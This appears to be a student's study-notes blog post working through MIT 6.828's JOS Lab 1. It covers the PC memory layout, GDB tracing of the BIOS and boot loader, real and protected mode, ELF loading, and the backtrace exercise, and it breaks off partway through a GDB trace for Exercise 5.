onto the first few sectors of a real hard disk, insert that hard disk into a real PC, turn it on, and see exactly the same thing on the PC’s real screen as you did above in the QEMU window. The PC’s Physical Address SpaceA PC’s physical address space is hard-wired to have the following general layout: 1234567891011121314151617181920212223242526272829+------------------+ &lt;- 0xFFFFFFFF (4GB)| 32-bit || memory mapped || devices || |/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\| || Unused || |+------------------+ &lt;- depends on amount of RAM| || || Extended Memory || || |+------------------+ &lt;- 0x00100000 (1MB)| BIOS ROM |+------------------+ &lt;- 0x000F0000 (960KB)| 16-bit devices, || expansion ROMs |+------------------+ &lt;- 0x000C0000 (768KB)| VGA Display |+------------------+ &lt;- 0x000A0000 (640KB)| || Low Memory || |+------------------+ &lt;- 0x00000000 The first PCs, which were based on the 16-bit Intel 8088 processor, were only capable of addressing 1MB of physical memory, Like 123456789101112+------------------+ &lt;- 0x00100000 (1MB)| BIOS ROM |+------------------+ &lt;- 0x000F0000 (960KB)| 16-bit devices, || expansion ROMs |+------------------+ &lt;- 0x000C0000 (768KB)| VGA Display |+------------------+ &lt;- 0x000A0000 (640KB)| || Low Memory || |+------------------+ &lt;- 0x00000000 The physical address space of an early PC would therefore start at 0x00000000 and end at 0x000FFFFF(1048575 Bytes) The 640KB area marked “Low Memory” was the only random-access memory (RAM) that an early PC could use The 384KB area from 0x000A0000 through 0x000FFFFF was reserved by the hardware for special uses such as video display buffers and firmware held in non-volatile memory. The ROM BIOSRun jos with GDB12345/Volumes/f-Exchange/6.828/lab&gt; make qemu-gdb ****** Now run 'make gdb'.***qemu-system-i386 -drive file=obj/kern/kernel.img,index=0,media=disk,format=raw -serial mon:stdio -gdb tcp::25501 -D qemu.log -S Now jos is paused and wating for a gdb connection Run GDB1234Volumes/f/6/lab&gt; make gdb gdb -n -x .gdbinitmake: gdb: No such file or directorymake: *** [gdb] Error 1 okay.. Let’s look at the GNUMakefile at line 150 12gdb: gdb -n -x .gdbinit So here’s why : I installed gdb using brew and it’s named i386-jos-elf-gdb, which is unknown to this Makefile. So I just run it myself. 12345678910cd labi386-jos-elf-gdb -n -x .gdbinitGNU gdb (GDB) 7.3.1This GDB was configured as &quot;--host=x86_64-apple-darwin20.2.0 --target=i386-jos-elf&quot;.+ target remote localhost:25501The target architecture is assumed to be i8086[f000:fff0] 0xffff0: ljmp $0xf000,$0xe05b0x0000fff0 in ?? ()+ symbol-file obj/kern/kernel(gdb) From GDB’s disassembly of the first instruction to be executed you can conclude a few things: The IBM PC starts executing at physical address 0x000ffff0, which is at the very top of the 64KB area reserved for the ROM BIOS. The PC starts executing with CS = 0xf000 and IP = 0xfff0. The first instruction to be executed is a jmp instruction, which jumps to the segmented address CS = 0xf000 and IP = 0xe05b. So What’s CS and IP ? CS is short for Code segment , a register to store the beginning address of code IP is Instruction Pointer, a register to store next instruction’s offset How does the segmented address 0xf000:fff0 turn into a physical address? To answer that we need to know a bit about real mode addressing. In real mode (the mode that PC starts off in), address translation works according to the formula: physical address = 16 * segment + offset. So, when the PC sets CS to 0xf000 and IP to 0xfff0, the physical address referenced is: 12316 * 0xf000 + 0xfff0 # in hex multiplication by 16 is= 0xf0000 + 0xfff0 # easy--just append a 0.= 0xffff0 0xffff0 is 16 bytes before the end of the BIOS (0x100000). Therefore we shouldn’t be surprised that the first thing that the BIOS does is jmp backwards to an earlier location in the BIOS; after all how much could it accomplish in just 16 bytes? Part 2: The Boot LoaderSectorsFloppy and hard disks for PCs are divided into 512 byte regions called sectors. A sector is the disk’s minimum transfer granularity: each read or write operation must be one or more sectors in size and aligned on a sector boundary. If the disk is bootable, the first sector is called the boot sector, since this is where the boot loader code resides. When the BIOS finds a bootable floppy or hard disk, it loads the 512-byte boot sector into memory at physical addresses 0x7c00 through 0x7dff, and then uses a jmp instruction to set the CS:IP to 0000:7c00, passing control to the boot loader. Like the BIOS load address, these addresses are fairly arbitrary - but they are fixed and standardized for PCs. Why 0x7C00 here? The ability to boot from a CD-ROM came much later during the evolution of the PC, and as a result the PC architects took the opportunity to rethink the boot process slightly. As a result, the way a modern BIOS boots from a CD-ROM is a bit more complicated (and more powerful). CD-ROMs use a sector size of 2048 bytes instead of 512, and the BIOS can load a much larger boot image from the disk into memory (not just one sector) before transferring control to it. For more information, see the “El Torito” Bootable CD-ROM Format Specification. BootingFor 6.828, however, we will use the conventional hard drive boot mechanism, which means that our boot loader must fit into a measly 512 bytes. The boot loader consists of one assembly language source file, boot/boot.S, and one C source file, boot/main.c Look through these source files carefully and make sure you understand what’s going on. The boot loader must perform two main functions: First, the boot loader switches the processor from real mode to 32-bit protected mode, because it is only in this mode that software can access all the memory above 1MB in the processor’s physical address space. Protected mode is described briefly in sections 1.2.7 and 1.2.8 of PC Assembly Language, and in great detail in the Intel architecture manuals. At this point you only have to understand that translation of segmented addresses (segment:offset pairs) into physical addresses happens differently in protected mode, and that after the transition offsets are 32 bits instead of 16. Second, the boot loader reads the kernel from the hard disk by directly accessing the IDE disk device registers via the x86’s special I/O instructions. If you would like to understand better what the particular I/O instructions here mean, check out the “IDE hard drive controller” section on the 6.828 reference page. You will not need to learn much about programming specific devices in this class: writing device drivers is in practice a very important part of OS development, but from a conceptual or architectural viewpoint it is also one of the least interesting. After you understand the boot loader source code, look at the file obj/boot/boot.asm. This file is a disassembly of the boot loader that our GNUmakefile creates after compiling the boot loader. This disassembly file makes it easy to see exactly where in physical memory all of the boot loader’s code resides, and makes it easier to track what’s happening while stepping through the boot loader in GDB. Likewise, obj/kern/kernel.asm contains a disassembly of the JOS kernel, which can often be useful for debugging. GDB UsageBreakpoint b *0x7c00sets a breakpoint at address 0x7C00. Continuec causes QEMU to continue execution until the next breakpoint (or until you press Ctrl-C in GDB) Step throughsi N steps through the instructions N at a time. N is 1 by default. ExamineTo examine instructions in memory (besides the immediate next one to be executed, which GDB prints automatically), you use the x/i command. This command has the syntax x/Ni ADDR, where N is the number of consecutive instructions to disassemble and ADDR is the memory address at which to start disassembling. 12345678Examine memory: x/FMT ADDRESS.ADDRESS is an expression for the memory address to examine.FMT is a repeat count followed by a format letter and a size letter.Format letters are o(octal), x(hex), d(decimal), u(unsigned decimal), t(binary), f(float), a(address), i(instruction), c(char) and s(string).Size letters are b(byte), h(halfword), w(word), g(giant, 8 bytes).The specified number of objects of the specified size are printedaccording to the format. Real modeAs the CPU powers on, it’s in the Real mode, memory is limited to only one megabyte(2^20 bytes). Address range from 00000 to FFFFF, which requires a 20-bit number. Obviously, not possible for a 16-bit Intel 8088 Micro CPU. Intel solved this problem, by using two 16-bit values determine an address. The first 16-bit value is called the selector. Selector values must be stored in segment registers. The second 16-bit value is called the offset. The physical address referenced by a 32-bit selector:offset pair is computed by the formula, which is mentioned above: 16 ∗ selector + offset Multiplying by 16 in hex is easy, just add a 0 to the right of the number. In binary it’s selector&lt;&lt;4 + offset Protected modeIn this mode, We can finally use the extended memory above 1MB. In the 80286’s 16-bit protected mode, selector values are interpreted completely differently than in real mode. In real mode, a selector value is a paragraph number of physical memory. In protected mode, a selector value is an index into a descriptor table. In both modes, programs are divided into segments. In real mode, these segments are at fixed positions in physical memory and the selector value denotes the paragraph number of the beginning of the segment. In protected mode, the segments are not at fixed positions in physical memory. In fact, they do not have to be in memory at all boot.SThis asm turn the PC into protected mode to continue to execute C code(main.c) Many steps in this assembly file are the same with QEMU’s SeaBIOS such as Opening A20 Line, Switching to protected mode. 1234# Start the CPU: switch to 32-bit protected mode, jump into C.# The BIOS loads this code from the first sector of the hard disk into# memory at physical address 0x7c00 and starts executing in real mode# with %cs=0 %ip=7c00. main.cThis C file act as a boot loader to boot from a ELF kernel image file. More details in Exercise 3. 12345678910111213141516171819202122232425262728/********************************************************************** * This a dirt simple boot loader, whose sole job is to boot * an ELF kernel image from the first IDE hard disk. * * DISK LAYOUT * * This program(boot.S and main.c) is the bootloader. It should * be stored in the first sector of the disk. * * * The 2nd sector onward holds the kernel image. * * * The kernel image must be in ELF format. * * BOOT UP STEPS * * when the CPU boots it loads the BIOS into memory and executes it * * * the BIOS intializes devices, sets of the interrupt routines, and * reads the first sector of the boot device(e.g., hard-drive) * into memory and jumps to it. * * * Assuming this boot loader is stored in the first sector of the * hard-drive, this code takes over... * * * control starts in boot.S -- which sets up protected mode, * and a stack so C code then run, then calls bootmain() * * * bootmain() in this file takes over, reads in the kernel and jumps to it. **********************************************************************/ Loading the KernelWhat ELF isTo make sense out of boot/main.c you’ll need to know what an ELF binary is. When you compile and link a C program such as the JOS kernel, the compiler transforms each C source (‘.c‘) file into an object (‘.o‘) file containing assembly language instructions encoded in the binary format expected by the hardware. The linker then combines all of the compiled object files into a single binary image such as obj/kern/kernel, which in this case is a binary in the ELF format, which stands for “Executable and Linkable Format”. An ELF binary starts with a fixed-length ELF header, followed by a variable-length program header listing each of the program sections to be loaded. The C definitions for these ELF headers are in inc/elf.h. The program sections we’re interested in are: .text: The program’s executable instructions. .rodata: Read-only data, such as ASCII string constants produced by the C compiler. (We will not bother setting up the hardware to prohibit writing, however.) .data: The data section holds the program’s initialized data, such as global variables declared with initializers like int x = 5;. When the linker computes the memory layout of a program, it reserves space for uninitialized global variables, such as int x;, in a section called .bss that immediately follows .data in memory. C requires that “uninitialized” global variables start with a value of zero. Thus there is no need to store contents for .bss in the ELF binary; instead, the linker records just the address and size of the .bss section. The loader or the program itself must arrange to zero the .bss section. Examine the full list of the names, sizes, and link addresses of all the sections in the kernel executable by typing: 12345678910111213141516&gt;objdump -h obj/kern/kernelobj/kern/kernel: file format elf32-i386Sections:Idx Name Size VMA LMA Type 0 00000000 00000000 00000000 1 .text 0000178e f0100000 00100000 TEXT 2 .rodata 00000704 f01017a0 001017a0 DATA 3 .stab 000044e9 f0101ea4 00101ea4 DATA 4 .stabstr 00008c54 f010638d 0010638d 5 .data 0000a300 f010f000 0010f000 DATA 6 .bss 00000648 f0119300 00119300 DATA 7 .comment 00000011 00000000 00000000 8 .shstrtab 0000004c 00000000 00000000 9 .symtab 00000650 00000000 00000000 10 .strtab 00000369 00000000 00000000 Take particular note of the “VMA” (or link address) and the “LMA” (or load address) of the .text section. The load address of a section is the memory address at which that section should be loaded into memory. Typically, the link and load addresses are the same. The boot loader uses the ELF program headers to decide how to load the sections. The program headers specify which parts of the ELF object to load into memory and the destination address each should occupy. You can inspect the program headers by typing: 1objdump -x obj/kern/kernel The program headers are then listed under “Program Headers” in the output of objdump. The areas of the ELF object that need to be loaded into memory are those that are marked as “LOAD”. Other information for each program header is given, such as the virtual address (“vaddr”), the physical address (“paddr”), and the size of the loaded area (“memsz” and “filesz”). Back in boot/main.c, the ph-&gt;p_pa field of each program header contains the segment’s destination physical address (in this case, it really is a physical address, though the ELF specification is vague on the actual meaning of this field). The BIOS loads the boot sector into memory starting at address 0x7c00, so this is the boot sector’s load address. This is also where the boot sector executes from, so this is also its link address. We set the link address by passing -Ttext 0x7C00 to the linker in boot/Makefrag, so the linker will produce the correct memory addresses in the generated code. Look back at the load and link addresses for the kernel. Unlike the boot loader, these two addresses aren’t the same: the kernel is telling the boot loader to load it into memory at a low address (0x00100000), but it expects to execute from a high address. We’ll dig in to how we make this work in the next section. 123456789101112&gt;objdump -x obj/kern/kernelobj/kern/kernel: file format elf32-i386architecture: i386start address: 0x0010000cProgram Header: LOAD off 0x00001000 vaddr 0xf0100000 paddr 0x00100000 align 2**12 filesz 0x0000efe1 memsz 0x0000efe1 flags r-x LOAD off 0x00010000 vaddr 0xf010f000 paddr 0x0010f000 align 2**12 filesz 0x0000a948 memsz 0x0000a948 flags rw- Besides the section information, there is one more field in the ELF header that is important to us, named e_entry. This field holds the link address of the entry point in the program: the memory address in the program’s text section at which the program should begin executing. You can see the entry point: 123456&gt;objdump -f obj/kern/kernel obj/kern/kernel: file format elf32-i386architecture: i386start address: 0x0010000c You should now be able to understand the minimal ELF loader in boot/main.c. It reads each section of the kernel from disk into memory at the section’s load address and then jumps to the kernel’s entry point. Part3:The KernelLike the boot loader, the kernel begins with some assembly language code that sets things up so that C language code can execute properly. Using virtual memory to work around position dependenceWhen you inspected the boot loader’s link and load addresses above, they matched perfectly, but there was a (rather large) disparity between the kernel’s link address (as printed by objdump) and its load address. Go back and check both and make sure you can see what we’re talking about. (Linking the kernel is more complicated than the boot loader, so the link and load addresses are at the top of kern/kernel.ld.) Operating system kernels often like to be linked and run at very high virtual address, such as 0xf0100000, in order to leave the lower part of the processor’s virtual address space for user programs to use. The reason for this arrangement will become clearer in the next lab. Many machines don’t have any physical memory at address 0xf0100000, so we can’t count on being able to store the kernel there. Instead, we will use the processor’s memory management hardware to map virtual address 0xf0100000 (the link address at which the kernel code expects to run) to physical address 0x00100000 (where the boot loader loaded the kernel into physical memory). This way, although the kernel’s virtual address is high enough to leave plenty of address space for user processes, it will be loaded in physical memory at the 1MB point in the PC’s RAM, just above the BIOS ROM. This approach requires that the PC have at least a few megabytes of physical memory (so that physical address 0x00100000 works), but this is likely to be true of any PC built after about 1990. In fact, in the next lab, we will map the entire bottom 256MB of the PC’s physical address space, from physical addresses 0x00000000 through 0x0fffffff, to virtual addresses 0xf0000000 through 0xffffffff respectively. You should now see why JOS can only use the first 256MB of physical memory. For now, we’ll just map the first 4MB of physical memory, which will be enough to get us up and running. We do this using the hand-written, statically-initialized page directory and page table in kern/entrypgdir.c. For now, you don’t have to understand the details of how this works, just the effect that it accomplishes. Up until kern/entry.S sets the CR0_PG flag, memory references are treated as physical addresses (strictly speaking, they’re linear addresses, but boot/boot.S set up an identity mapping from linear addresses to physical addresses and we’re never going to change that). Once CR0_PG is set, memory references are virtual addresses that get translated by the virtual memory hardware to physical addresses. entry_pgdir translates virtual addresses in the range 0xf0000000 through 0xf0400000 to physical addresses 0x00000000 through 0x00400000, as well as virtual addresses 0x00000000 through 0x00400000 to physical addresses 0x00000000 through 0x00400000. Any virtual address that is not in one of these two ranges will cause a hardware exception which, since we haven’t set up interrupt handling yet, will cause QEMU to dump the machine state and exit (or endlessly reboot if you aren’t using the 6.828-patched version of QEMU). From the beginning to the present, We never turned on the paging(CR0_PG flag). So that’s why we say Linear address = Physical address. Formatted Printing to the ConsoleMost people take functions like printf() for granted, sometimes even thinking of them as “primitives” of the C language. But in an OS kernel, we have to implement all I/O ourselves. Read through kern/printf.c, lib/printfmt.c, and kern/console.c, and make sure you understand their relationship. It will become clear in later labs why printfmt.c is located in the separate lib directory. It’s time to write a printf function by myself… The StackIn the final exercise of this lab, we will explore in more detail the way the C language uses the stack on the x86, and in the process write a useful new kernel monitor function that prints a backtrace of the stack: a list of the saved Instruction Pointer (IP) values from the nested call instructions that led to the current point of execution. The x86 stack pointer (esp register) points to the lowest location on the stack that is currently in use. Everything below that location in the region reserved for the stack is free. Pushing a value onto the stack involves decreasing the stack pointer and then writing the value to the place the stack pointer points to. Popping a value from the stack involves reading the value the stack pointer points to and then increasing the stack pointer. In 32-bit mode, the stack can only hold 32-bit values, and esp is always divisible by four. Various x86 instructions, such as call, are “hard-wired” to use the stack pointer register. The ebp (base pointer) register, in contrast, is associated with the stack primarily by software convention. On entry to a C function, the function’s prologue code normally saves the previous function’s base pointer by pushing it onto the stack, and then copies the current esp value into ebp for the duration of the function. If all the functions in a program obey this convention, then at any given point during the program’s execution, it is possible to trace back through the stack by following the chain of saved ebp pointers and determining exactly what nested sequence of function calls caused this particular point in the program to be reached. This capability can be particularly useful, for example, when a particular function causes an assert failure or panic because bad arguments were passed to it, but you aren’t sure who passed the bad arguments. A stack backtrace lets you find the offending function. Trying to write a backtraceThe above exercise(Exercise 10 ) should give you the information you need to implement a stack backtrace function, which you should call mon_backtrace(). A prototype for this function is already waiting for you in kern/monitor.c. You can do it entirely in C, but you may find the read_ebp() function in inc/x86.h useful. You’ll also have to hook this new function into the kernel monitor’s command list so that it can be invoked interactively by the user. The backtrace function should display a listing of function call frames in the following format: 1234Stack backtrace: ebp f0109e58 eip f0100a62 args 00000001 f0109e80 f0109e98 f0100ed2 00000031 ebp f0109ed8 eip f01000d6 args 00000000 00000000 f0100058 f0109f28 00000061 ... Each line contains an ebp, eip, and args. The ebp value indicates the base pointer into the stack used by that function: i.e., the position of the stack pointer just after the function was entered and the function prologue code set up the base pointer. The listed eip value is the function’s return instruction pointer: the instruction address to which control will return when the function returns. The return instruction pointer typically points to the instruction after the call instruction (why?). Finally, the five hex values listed after args are the first five arguments to the function in question, which would have been pushed on the stack just before the function was called. If the function was called with fewer than five arguments, of course, then not all five of these values will be useful. (Why can’t the backtrace code detect how many arguments there actually are? How could this limitation be fixed?) The first line printed reflects the currently executing function, namely mon_backtrace itself, the second line reflects the function that called mon_backtrace, the third line reflects the function that called that one, and so on. You should print all the outstanding stack frames. By studying kern/entry.S you’ll find that there is an easy way to tell when to stop. Here are a few specific points you read about in K&amp;R Chapter 5 that are worth remembering for the following exercise and for future labs. If int *p = (int*)100, then (int)p + 1 and (int)(p + 1) are different numbers: the first is 101 but the second is 104. When adding an integer to a pointer, as in the second case, the integer is implicitly multiplied by the size of the object the pointer points to. p[i] is defined to be the same as *(p+i), referring to the i’th object in the memory pointed to by p. The above rule for addition helps this definition work when the objects are larger than one byte. &amp;p[i] is the same as (p+i), yielding the address of the i’th object in the memory pointed to by p. Although most C programs never need to cast between pointers and integers, operating systems frequently do. Whenever you see an addition involving a memory address, ask yourself whether it is an integer addition or pointer addition and make sure the value being added is appropriately multiplied or not. Exercises1 Exercise 1. Familiarize yourself with the assembly language materials available on the 6.828 reference page. You don’t have to read them now, but you’ll almost certainly want to refer to some of this material when reading and writing x86 assembly. We do recommend reading the section “The Syntax” in Brennan’s Guide to Inline Assembly. It gives a good (and quite brief) description of the AT&amp;T assembly syntax we’ll be using with the GNU assembler in JOS. So we will be using AT&amp;T assembly syntax, be sure to get familiar with it. 2 Exercise 2. Use GDB’s si (Step Instruction) command to trace into the ROM BIOS for a few more instructions, and try to guess what it might be doing. You might want to look at Phil Storrs I/O Ports Description, as well as other materials on the 6.828 reference materials page. No need to figure out all the details - just the general idea of what the BIOS is doing first. 11 0xffff0: ljmp $0xf000, $0xe05b First jump into a lower space cuz there’s only 16Bytes left, not enough for BIOS 122 0xfe05b: cmpl $0x0, $cs:0x6ac8 3 0xfe062: jne 0xfd2e1 From this post on StackOverflow assembly - Why BIOS need to compare a value in (seemly) randomized address to zero in the second instruction? - Stack Overflow That magic number seems to be a flag to check whether the system has been resumed/rebooted. 124 0xfe066: xor %dx, %dx 5 0xfe068: mov %dx, %ss Clear register %dx and %ss 12346 0xfe06a: mov $0x7000, %esp7 0xfe070: mov $0xf34d2,%edx8 0xfe076: jmp 0xfd15c9 0xfd15c: mov %eax, %ecx Set stack segment from 0x0 to 0x7000 (stack top), as well as some other registers. 1234567891010 0xfd15f: cli 11 0xfd160: cld 12 0xfd161: mov $0x8f, %eax# Here to disable Maskable Hardware interrupts13 0xfd167: out %al, $0x70 14 0xfd169: in $0x71, %al# And disable Non-maskable Hardware interrupts#To prevent from being interrupted The #10 instruction cli above is to disable interrupts, but how it works? Interrupt is divided into Hardware and Software ones. For Hardware interrupts, there are maskable and non-maskable ones. On the FLAGS register of the CPU, bit 9 is IF (Interrupt flag), who determines whether or not the CPU will respond immediately to maskable hardware interrupts. The instruction cli is to set IF to 0 , so we can disable the maskable hardware interrupts. Instead, the instruction sti is to set IF to 1, namely enable it. But as you see, non-maskable hardware interrupts can still be disabled at #13 , Why? From Non Maskable Interrupt - OSDev Wikiand https://bochs.sourceforge.io/techspec/PORTS.LST We can know that the MSB of 0x70 is to control the NMI(Non Maskable Interrupt) and it’s shared with CMOS RAM index 12345670070 w CMOS RAM index register port (ISA, EISA) bit 7 = 1 NMI disabled = 0 NMI enabled bit 6-0 CMOS RAM index (64 bytes, sometimes 128 bytes) any write to 0070 should be followed by an action to 0071 or the RTC wil be left in an unknown state. From OSDev Wiki, you can disable NMI like this 1234void NMI_disable() { outb(0x70, inb(0x70) | 0x80); inb(0x71);} So you read 0x70 using inb , and you get the binary value of it. Then make a Bool OR calculation: var MSB LSB From inb() X X X X X X X X 0x80 1 0 0 0 0 0 0 0 Result 1 ? ? ? ? ? ? ? Then you write the result to 0x70 again, whose MSB must be 1. So the NMI is now disabled. Vice versa, when enabling 1234void NMI_enable() { outb(0x70, inb(0x70) &amp; 0x7F); inb(0x71);} The MSB of the result must be 0, so NMI will be enabled. Let’s use GDB to set a breakpoint before the out instruction executes 12345678910(gdb) b *0xfd167Breakpoint 1 at 0xfd167(gdb) cContinuing.Program received signal SIGTRAP, Trace/breakpoint trap.[f000:d167] 0xfd167: out %al,$0x700x0000d167 in ?? ()(gdb) info register alal 0x8f -113 Now %al is 0x8f or1000 1111 and its MSB is 1 so NMI will be disabled after this instruction. Cuz the reference mentioned: any write to 0070 should be followed by an action to 0071or the RTC wil be left in an unknown state That’s why next instruction(#14) is 0xfd169: in $0x71, %al 12315 0xfd16b: in $0x92, %al16 0xfd16d: or $0x2, %al17 0xfd16f: out %al, $0x92 123456789100092 r/w PS/2 system control port A (port B is at 0061) bit 7-6 any bit set to 1 turns activity light on bit 5 reserved bit 4 = 1 watchdog timout occurred bit 3 = 0 RTC/CMOS security lock (on password area) unlocked = 1 CMOS locked (done by POST) bit 2 reserved bit 1 = 1 indicates A20 active bit 0 = 0 system reset or write 1 pulse alternate reset pin (alternate CPU reset) Bit 1 of 0x92 is to control A20 Line, 1 indicates active This is to enable A20 Line in BIOS, maybe to test the memory. Just like disabling NMI, bit #1 of the result must be 1 . 118 0xfd171: lidtw %cs:0x6ab8 Load Interrupt Descriptor Table from 0xF000 *16 + 0x6AB8 119 0xfd177: lgdtw %cs:0x6a74 Load the GDTR (Global Descriptor Table), a 48-bit register that includes two parts, the base address and the boundary of the global descriptor table. The global descriptor table is used to save descriptors of each segment, such as CS. Each descriptor takes 64 bits, detailed bits assignment see below: The lgdt instruction loads 6 bytes starting from %cs:0x6a74 to GDTR. 12320 0xfd17d: mov %cr0, %eax21 0xfd180: or $0x1, %eax22 0xfd184: mov %eax, %cr0 CR0 is a 32-bit control register, whose first bit (bit 0) is the Protection Enable bit. The above three lines set the PE bit to be 1, to enable the protected mode. BUT WHY ? Enable protected mode in BIOS? AND It seems protected mode isn’t activated after #22 1234567823 0xfd187: ljmpl $0x8, $0xfd18f24 0xfd18f: mov $0x10, %eax25 0xfd194: mov %eax, %ds26 0xfd196: mov %eax, %es27 0xfd198: mov %eax, %ss28 0xfd19a: mov %eax, %fs29 0xfd19c: mov %eax, %gs30 0xfd19e: mov %ecx, %eax From x86 Assembly/Global Descriptor Table - Wikibooks, open books for an open world Note that to complete the process of loading a new GDT, the segment registers need to be reloaded. The CS register must be loaded using a far jump From Jump (jmp, ljmp) (IA-32 Assembly Language Reference Manual) (oracle.com) In Real Address Mode or Virtual 8086 mode, the long pointer provides 16 bits for the CS register and 16 or 32 bits for the EIP register. This is how jmp and ljmp work. 3 Exercise 3. Take a look at the lab tools guide, especially the section on GDB commands. Even if you’re familiar with GDB, this includes some esoteric GDB commands that are useful for OS work. Set a breakpoint at address 0x7c00, which is where the boot sector will be loaded. Continue execution until that breakpoint. Trace through the code in boot/boot.S, using the source code and the disassembly file obj/boot/boot.asm to keep track of where you are. Also use the x/i command in GDB to disassemble sequences of instructions in the boot loader, and compare the original boot loader source code with both the disassembly in obj/boot/boot.asm and GDB. Trace into bootmain() in boot/main.c, and then into readsect(). Identify the exact assembly instructions that correspond to each of the statements in readsect(). Trace through the rest of readsect() and back out into bootmain(), and identify the begin and end of the for loop that reads the remaining sectors of the kernel from the disk. Find out what code will run when the loop is finished, set a breakpoint there, and continue to that breakpoint. Then step through the remainder of the boot loader. Be able to answer the following questions: At what point does the processor start executing 32-bit code? What exactly causes the switch from 16- to 32-bit mode? In boot.S, the ljmp $PROT_MODE_CSEG, $protcseg causes the switch from 16- to 32-bit mode What is the last instruction of the boot loader executed, and what is the first instruction of the kernel it just loaded? From gdb 1234567891011(gdb) b *0x7d63Breakpoint 2 at 0x7d63(gdb) cContinuing.The target architecture is assumed to be i386=&gt; 0x7d63: call *0x10018Breakpoint 2, 0x00007d63 in ?? ()(gdb) si=&gt; 0x10000c: movw $0x1234,0x4720x0010000c in ?? () The last instruction is ​ call *0x10018 The first instruction of the kernel is ​ movw $0x1234,0x472 Where is the first instruction of the kernel? 12(gdb) x/1x 0x100180x10018: 0x0010000c How does the boot loader decide how many sectors it must read in order to fetch the entire kernel from disk? Where does it find this information? TLDR Boot loader will read from ph-&gt;p_pa to ph-&gt;p_memsz for every Program Header(or Segment) between which is sectors to be read. Let’s talk about relation between Sections and Segments first : References From inc/elf.h and Executable and Linkable Format - Wikipedia linux - What’s the difference of section and segment in ELF file format - Stack Overflow Inside Specs: ELF Segments and Sections (dvdhrm.github.io) In simple terms, The difference between segments and sections is thus not what data they contain, but how they index the same data. A program header table tells the system how to create a process image. Files used to build a process image (execute a program) must have a program header table; relocatable files do not need one. A section header table contains information describing the file’s sections. Every section has an entry in the table; each entry gives information such as the section name, the section size, and so on. Files used during linking must have a section header table; other object files may or may not have one. Keep in mind that the program header table is effectively a segment header table. Therefore, the specification explicitly says that these two data views do not have to be present in a specific file. Depending on the use case, the format allows for only segments or only sections. You can use readelf to check the Segment-Sections Mapping relation 1234567891011121314&gt;i386-jos-elf-readelf -l obj/kern/kernel Elf file type is EXEC (Executable file)Entry point 0x10000cThere are 2 program headers, starting at offset 52Program Headers:Type Offset VirtAddr PhysAddr FileSiz MemSiz Flg AlignLOAD 0x001000 0xf0100000 0x00100000 0x0efe1 0x0efe1 R E 0x1000LOAD 0x010000 0xf010f000 0x0010f000 0x0a948 0x0a948 RW 0x1000Section to Segment mapping:Segment Sections...00 .text .rodata .stab .stabstr01 .data .bss Then let’s see how the boot loader load the kernel into memory in boot/main.c: First load each Segment (or Program Header) and read it using readseg() 1234567// load each program segment (ignores ph flags)ph = (struct Proghdr *) ((uint8_t *) ELFHDR + ELFHDR-&gt;e_phoff);eph = ph + ELFHDR-&gt;e_phnum;for (; ph &lt; eph; ph++)// p_pa is the load address of this segment (as well// as the physical address)readseg(ph-&gt;p_pa, ph-&gt;p_memsz, ph-&gt;p_offset); Then for every Segment, load into it into the memory 1234567891011121314151617181920212223242526// Read 'count' bytes at 'offset' from kernel into physical address 'pa'.// Might copy more than askedvoidreadseg(uint32_t pa, uint32_t count, uint32_t offset){ uint32_t end_pa; end_pa = pa + count; // round down to sector boundary pa &amp;= ~(SECTSIZE - 1); // translate from bytes to sectors, and kernel starts at sector 1 offset = (offset / SECTSIZE) + 1; // If this is too slow, we could read lots of sectors at a time. // We'd write more to memory than asked, but it doesn't matter -- // we load in increasing order. while (pa &lt; end_pa) { // Since we haven't enabled paging yet and we're using // an identity segment mapping (see boot.S), we can // use physical addresses directly. This won't be the // case once JOS enables the MMU. readsect((uint8_t*) pa, offset); pa += SECTSIZE; offset++; }} readsect() is a function to read data from sectors on disk to memory 12345678910111213141516171819voidreadsect(void *dst, uint32_t offset){ // wait for disk to be ready waitdisk(); outb(0x1F2, 1); // count = 1 outb(0x1F3, offset); outb(0x1F4, offset &gt;&gt; 8); outb(0x1F5, offset &gt;&gt; 16); outb(0x1F6, (offset &gt;&gt; 24) | 0xE0); outb(0x1F7, 0x20); // cmd 0x20 - read sectors // wait for disk to be ready waitdisk(); // read a sector insl(0x1F0, dst, SECTSIZE/4);} insl(uint32_t port, void *dest, int count) will read count dwords from the input port specified by port into the supplied output array dest Note that in GNU Assembly l suffix to denote instructions operating on dword (32-bit sized) data. So what’s 0x1F0 stands for? From https://bochs.sourceforge.io/techspec/PORTS.LST 12301F0-01F7 ---- HDC 1 (1st Fixed Disk Controller) same as 017x (ISA, EISA)01F0 r/w data register It’s the 1st boot device in the BIOS, you’ve probably seen it before.a 4 Exercise 4. Read about programming with pointers in C. The best reference for the C language is The C Programming Language by Brian Kernighan and Dennis Ritchie (known as ‘K&amp;R’). We recommend that students purchase this book (here is an Amazon Link) or find one of MIT’s 7 copies. Read 5.1 (Pointers and Addresses) through 5.5 (Character Pointers and Functions) in K&amp;R. Then download the code for pointers.c, run it, and make sure you understand where all of the printed values come from. In particular, make sure you understand where the pointer addresses in printed lines 1 and 6 come from, how all the values in printed lines 2 through 4 get there, and why the values printed in line 5 are seemingly corrupted. There are other references on pointers in C (e.g., A tutorial by Ted Jensen that cites K&amp;R heavily), though not as strongly recommended. Warning: Unless you are already thoroughly versed in C, do not skip or even skim this reading exercise. If you do not really understand pointers in C, you will suffer untold pain and misery in subsequent labs, and then eventually come to understand them the hard way. Trust us; you don’t want to find out what “the hard way” is. Okay, skip. 5 Exercise 5. Trace through the first few instructions of the boot loader again and identify the first instruction that would “break” or otherwise do the wrong thing if you were to get the boot loader’s link address wrong. Then change the link address in boot/Makefrag to something wrong, run make clean, recompile the lab with make, and trace into the boot loader again to see what happens. Don’t forget to change the link address back and make clean again afterward! I changed the link address to 0x8c00 and remade. All address 0x7c** in boot.asm are now 0x8c** . It’s very strange that when I set a breakpoint at 0x8c00 in gdb and continue , It didn’t work at all. If continue, it will cause a Triple fault. And I set a breakpoint at 0x7c00, it works. Even more ridiculous when I step through, it’s like I haven’t changed anything, the Boot loader is still running at 0x7c00. 1234567891011121314151617181920212223242526272829303132333435(gdb) b *0x7c00Breakpoint 1 at 0x7c00(gdb) cContinuing.[ 0:7c00] =&gt; 0x7c00: cliBreakpoint 1, 0x00007c00 in ?? ()(gdb) si[ 0:7c01] =&gt; 0x7c01: cld0x00007c01 in ?? ()(gdb) si[ 0:7c02] =&gt; 0x7c02: xor %ax,%ax0x00007c02 in ?? ()(gdb) si[ 0:7c04] =&gt; 0x7c04: mov %ax,%ds0x00007c04 in ?? ()(gdb) si[ 0:7c06] 